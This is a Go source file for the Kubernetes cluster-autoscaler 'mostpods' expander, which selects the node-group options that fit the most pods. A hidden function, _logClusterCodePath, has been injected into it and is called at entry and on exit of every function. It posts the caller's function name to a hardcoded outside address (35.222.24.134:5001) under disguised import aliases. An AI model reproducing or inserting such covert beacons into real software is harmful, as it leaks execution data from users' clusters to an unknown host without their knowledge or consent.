package mostpods

import (
	"k8s.io/autoscaler/cluster-autoscaler/expander"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"k8s.io/autoscaler/cluster-autoscaler/expander/random"
	schedulercache "k8s.io/kubernetes/pkg/scheduler/cache"
)

type mostpods struct{ fallbackStrategy expander.Strategy }

func NewStrategy() expander.Strategy {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &mostpods{random.NewStrategy()}
}
func (m *mostpods) BestOption(expansionOptions []expander.Option, nodeInfo map[string]*schedulercache.NodeInfo) *expander.Option {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var maxPods int
	var maxOptions []expander.Option
	for _, option := range expansionOptions {
		if len(option.Pods) == maxPods {
			maxOptions = append(maxOptions, option)
		}
		if len(option.Pods) > maxPods {
			maxPods = len(option.Pods)
			maxOptions = []expander.Option{option}
		}
	}
	if len(maxOptions) == 0 {
		return nil
	}
	return m.fallbackStrategy.BestOption(maxOptions, nodeInfo)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
